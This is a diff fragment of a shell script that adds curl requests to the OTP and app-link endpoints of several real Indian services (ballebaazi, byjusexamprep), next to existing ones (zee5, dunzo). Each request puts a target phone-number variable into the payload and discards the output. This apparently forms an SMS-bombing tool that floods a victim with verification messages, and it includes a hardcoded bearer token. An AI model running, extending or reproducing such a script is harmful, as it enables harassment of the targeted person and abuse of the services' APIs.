@@ -374,7 +374,35 @@ curl 'https://auth.zee5.com/v1/user/sendotp' \
   -H 'sec-ch-ua-mobile: ?0' \
   -H 'sec-ch-ua-platform: "Windows"' \
   --data-raw '{"phoneno":"91€tor"}' \
-  --compressed > /dev/null 2>&1 
+  --compressed > /dev/null 2>&1
+  curl 'https://bbapi.ballebaazi.com/users/applink' \
+  -H 'authority: bbapi.ballebaazi.com' \
+  -H 'accept: application/json, text/javascript, */*; q=0.01' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJvcHRpb24iOiJndWVzdCIsInR5cGUiOiJhdXRoIiwiaWF0IjoxNjc4MTAzMTcxLCJleHAiOjE2ODI0MjMxNzF9.b74sNDlHvTqzdmwAPye3CtuOrxrZ4A0ERoW7T2XB8VI' \
+  -H 'content-type: application/json' \
+  -H 'origin: https://www.ballebaazi.com' \
+  -H 'referer: https://www.ballebaazi.com/' \
+  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-site' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
+  --data-raw '{"phone":"€tor"}' \
+  --compressed > /dev/null 2>&1
+  curl 'https://webapi.byjusexamprep.com/user/verify/sendOtp' \
+  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
+  -H 'content-type: application/json; charset=utf-8' \
+  -H 'accept: application/json; charset=utf-8' \
+  -H 'Referer: https://byjusexamprep.com/' \
+  -H 'deviceType: web' \
+  --data-raw '{"tel":"+91€tor","deviceType":"web"}' \
+  --compressed > /dev/null 2>&1
 curl 'https://www.dunzo.com/api/v0/auth/sign-up' \
   -H 'authority: www.dunzo.com' \
   -H 'accept: application/json, text/plain, */*' \
